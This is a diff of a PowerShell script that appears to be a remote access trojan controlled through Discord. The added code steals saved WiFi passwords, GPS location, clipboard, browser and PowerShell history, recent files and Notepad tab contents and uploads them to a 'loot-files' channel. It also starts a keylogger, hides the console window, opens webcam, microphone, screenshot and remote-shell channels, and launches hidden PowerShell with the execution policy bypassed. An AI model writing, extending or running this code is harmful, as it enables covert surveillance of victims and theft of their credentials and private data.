+    $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
+    $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
+    # Current System Metrics
+    function Get-PerformanceMetrics {
+        $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
+        $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
+        $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
+        $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
+    
+        return [PSCustomObject]@{
+            CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
+            MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
+            DiskIO = "{0:F2}" -f $diskIO.CookedValue
+            NetworkIO = "{0:F2}" -f $networkIO.CookedValue
+        }
+    }
+    $metrics = Get-PerformanceMetrics
+    $PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
+    $PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
+    $PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
+    $PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
+    # Saved WiFi Network Info
+    $outssid = ''
+    $a=0
+    $ws=(netsh wlan show profiles) -replace ".*:\s+"
+    foreach($s in $ws){
+        if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
+            $ssid=$s.Trim()
+            if($s -Match ":"){
+                $ssid=$s.Split(":")[1].Trim()
+                }
+            $pw=(netsh wlan show profiles name=$ssid key=clear)
+            $pass="None"
+            foreach($p in $pw){
+                if($p -Match "Key Content"){
+                $pass=$p.Split(":")[1].Trim()
+                $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
+                }
+            }
+        }
+        $a++
+    }
+    # GPS Location Info
+    Add-Type -AssemblyName System.Device
+    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
+    $GeoWatcher.Start()
+    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+    	Sleep -M 100
+    }  
+    if ($GeoWatcher.Permission -eq 'Denied'){
+        $GPS = "Location Services Off"
+    }
+    else{
+    	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
+    	$GL = $GL -split " "
+    	$Lat = $GL[0].Substring(11) -replace ".$"
+    	$Lon = $GL[1].Substring(10) -replace ".$"
+        $GPS = "LAT = $Lat LONG = $Lon"
+    }
+    function EnumNotepad{
+    $appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
+    $directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
+    $matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
+    foreach ($dir in $matchingDirectories) {
+        $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
+        $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
+        foreach ($fullFilePath in $listOfBinFiles) {
+            if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
+                continue
+            }
+            $seperator = ("========================== NOTEPAD TABS ===============================")
+            $SMseperator = ("-" * 60)
+            $seperator | Out-File -FilePath $outpath -Append
+            $filename = $fullFilePath.Name
+            $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
+            $isSavedFile = $contents[3]
+            if ($isSavedFile -eq 1) {
+                $lengthOfFilename = $contents[4]
+                $filenameEnding = 5 + $lengthOfFilename * 2
+                $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
+                "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
+                $filename | Out-File -FilePath $outpath -Append
+                $SMseperator | Out-File -FilePath $outpath -Append
+                Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append
+    
+            } else {
+                "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
+                $filename | Out-File -FilePath $outpath -Append
+                $SMseperator | Out-File -FilePath $outpath -Append
+                $filenameEnding = 0
+                $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
+                $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
+                $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
+                $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
+                $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
+                $originalFileContent = ""
+                for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
+                    if ($originalFileBytes[$i] -ne 0) {
+                        $originalFileContent += [char]$originalFileBytes[$i]
+                    }
+                }
+                $originalFileContent | Out-File -FilePath $outpath -Append
+            }
+         "`n" | Out-File -FilePath $outpath -Append
+        }
+    }
+    }
+
+$infomessage = "
+==================================================================================================================================
+      _________               __                           .__        _____                            __  .__               
+     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
+     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
+     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
+    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
+            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
+==================================================================================================================================
+"
+$infomessage1 = "``````
+=============================================================
+SYSTEM INFORMATION FOR $env:COMPUTERNAME
+=============================================================
+User Information
+-------------------------------------------------------------
+Current User          : $env:USERNAME
+Email Address         : $email
+Language              : $systemLanguage
+Keyboard Layout       : $keyboardLayoutID
+Other Accounts        : $users
+Current OS            : $OSString
+Build ID              : $ver
+Architechture         : $OSArch
+Screen Size           : $screensize
+Location              : $GPS
+=============================================================
+Hardware Information
+-------------------------------------------------------------
+Processor             : $processor 
+Memory                : $RamInfo
+Gpu                   : $gpu
+
+Storage
+----------------------------------------
+$Hddinfo
+$DiskHealth
+Current System Metrics
+----------------------------------------
+$PMcpu
+$PMmu
+$PMdio
+$PMnio
+=============================================================
+Network Information
+-------------------------------------------------------------
+Public IP Address     : $computerPubIP
+``````"
+$infomessage2 = "
+
+Saved WiFi Networks
+----------------------------------------
+$outssid
+
+Nearby Wifi Networks
+----------------------------------------
+$Wifi
+==================================================================================================================================
+History Information
+----------------------------------------------------------------------------------------------------------------------------------
+Clipboard Contents
+---------------------------------------
+$clipboard
+
+Browser History
+----------------------------------------
+$Value
+
+Powershell History
+---------------------------------------
+$pshistory
+
+==================================================================================================================================
+Recent File Changes Information
+----------------------------------------------------------------------------------------------------------------------------------
+$RecentFiles
+
+==================================================================================================================================
+USB Information
+----------------------------------------------------------------------------------------------------------------------------------
+$usbdevices
+
+==================================================================================================================================
+Software Information
+----------------------------------------------------------------------------------------------------------------------------------
+$software
+
+==================================================================================================================================
+Running Services Information
+----------------------------------------------------------------------------------------------------------------------------------
+$service
+
+==================================================================================================================================
+Current Processes Information
+----------------------------------------------------------------------------------------------------------------------------------
+$process
+
+=================================================================================================================================="
+    $outpath = "$env:TEMP/systeminfo.txt"
+    $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
+    $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
+    $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
+    
+    if ($OSString -like '*11*'){
+        EnumNotepad
+    }
+    else{
+        "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
+    }
+    
+    sendMsg -Message $infomessage1
+    sendFile -sendfilePath $outpath
+    Sleep 1
+    Remove-Item -Path $outpath -force
+    }
+
+    
+    Function FolderTree{
+        sendMsg -Message ":arrows_counterclockwise: ``Getting File Trees..`` :arrows_counterclockwise:"
+        tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
+        tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
+        tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
+        $FilePath ="$env:temp/TreesOfKnowledge.zip"
+        Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
+        sleep 1
+        sendFile -sendfilePath $FilePath | Out-Null
+        rm -Path $FilePath -Force
+        Write-Output "Done."
+    }
+
+    sendMsg -Message ":hourglass: ``$env:COMPUTERNAME Getting Loot Files.. Please Wait`` :hourglass:"
+    SystemInfo
+    BrowserDB
+    FolderTree
+
+}
+
 # Scriptblock for PS console in discord
 $doPowershell = {
 param([string]$token,[string]$PowershellID)
@@ -1269,6 +1244,7 @@ param([string]$token,[string]$PowershellID)
     }
 }
 
+# Scriptblock for keycapture to discord
 $doKeyjob = {
 param([string]$token,[string]$keyID)
     sleep 5
@@ -1435,70 +1411,9 @@ function StartAll{
     sleep 1
     Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
     sleep 1
+    Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
+    sleep 1
     Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
-}
-
-# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
-
-# Hide the console
-If ($hideconsole -eq 1){ 
-    HideWindow
-}
-# Create category and new channels
-NewChannelCategory
-sleep 1
-NewChannel -name 'session-control'
-$global:SessionID = $ChannelID
-$global:ch = $ChannelID
-sleep 1
-NewChannel -name 'screenshots'
-$global:ScreenshotID = $ChannelID
-sleep 1
-NewChannel -name 'webcam'
-$global:WebcamID = $ChannelID
-sleep 1
-NewChannel -name 'microphone'
-$global:MicrophoneID = $ChannelID
-sleep 1
-NewChannel -name 'keycapture'
-$global:keyID = $ChannelID
-sleep 1
-NewChannel -name 'powershell'
-$global:PowershellID = $ChannelID
-sleep 1
-# Download ffmpeg to temp folder
-$Path = "$env:Temp\ffmpeg.exe"
-If (!(Test-Path $Path)){  
-    GetFfmpeg
-}
-# Start all functions upon running the script
-If ($defaultstart -eq 1){ 
-    StartAll
-}
-
-# Send setup complete message to discord
-sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"
-
-# ---------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Function CloseMsg {
-$script:jsonPayload = @{
-    username   = $env:COMPUTERNAME
-    tts        = $false
-    embeds     = @(
-        @{
-            title       = " $env:COMPUTERNAME | Session Closed "
-            "description" = @"
-:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
-"@
-            color       = 16711680
-            footer      = @{
-                text = "$timestamp"
-            }
-        }
-    )
-}
-sendMsg -Embed $jsonPayload
 }
 
 Function ConnectMsg {
@@ -1535,13 +1450,74 @@ sendMsg -Embed $jsonPayload
 
     if ($InfoOnConnect -eq '1'){
  	    quickInfo
-  	    $dir = $PWD.Path
-	    sendMsg -Message "``PS | $dir>``"
     }
-    else{
-        $dir = $PWD.Path
-	    sendMsg -Message "``PS | $dir>``"
-    }
+    else{}
+}
+
+# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
+# Hide the console
+If ($hideconsole -eq 1){ 
+    HideWindow
+}
+# Create category and new channels
+NewChannelCategory
+sleep 1
+NewChannel -name 'session-control'
+$global:SessionID = $ChannelID
+$global:ch = $ChannelID
+sleep 1
+NewChannel -name 'screenshots'
+$global:ScreenshotID = $ChannelID
+sleep 1
+NewChannel -name 'webcam'
+$global:WebcamID = $ChannelID
+sleep 1
+NewChannel -name 'microphone'
+$global:MicrophoneID = $ChannelID
+sleep 1
+NewChannel -name 'keycapture'
+$global:keyID = $ChannelID
+sleep 1
+NewChannel -name 'loot-files'
+$global:LootID = $ChannelID
+sleep 1
+NewChannel -name 'powershell'
+$global:PowershellID = $ChannelID
+sleep 1
+# Download ffmpeg to temp folder
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+    GetFfmpeg
+}
+# Opening info message
+ConnectMsg
+# Start all functions upon running the script
+If ($defaultstart -eq 1){ 
+    StartAll
+}
+# Send setup complete message to discord
+sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"
+
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Function CloseMsg {
+$script:jsonPayload = @{
+    username   = $env:COMPUTERNAME
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = " $env:COMPUTERNAME | Session Closed "
+            "description" = @"
+:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
+"@
+            color       = 16711680
+            footer      = @{
+                text = "$timestamp"
+            }
+        }
+    )
+}
+sendMsg -Embed $jsonPayload
 }
 
 Function VersionCheck {
@@ -1569,7 +1545,6 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm h
 # =============================================================== MAIN LOOP =========================================================================
 
 VersionCheck
-ConnectMsg
 
 while ($true) {
 
@@ -1591,6 +1566,8 @@ while ($true) {
         $sceenrunning = Get-Job -Name Screen
         $audiorunning = Get-Job -Name Audio
         $PSrunning = Get-Job -Name PSconsole
+        $lootrunning = Get-Job -Name Info
+        $keysrunning = Get-Job -Name Keys
         if ($messages -eq 'webcam'){
             if (!($camrunning)){
                 Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
@@ -1620,9 +1597,16 @@ while ($true) {
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
         if ($messages -eq 'keycapture'){
-            if (!($audiorunning)){
+            if (!($keysrunning)){
                 Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
-                sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Keycapture Session Started!`` :microphone2:"
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
+            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+        }
+        if ($messages -eq 'systeminfo'){
+            if (!($lootrunning)){
+                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
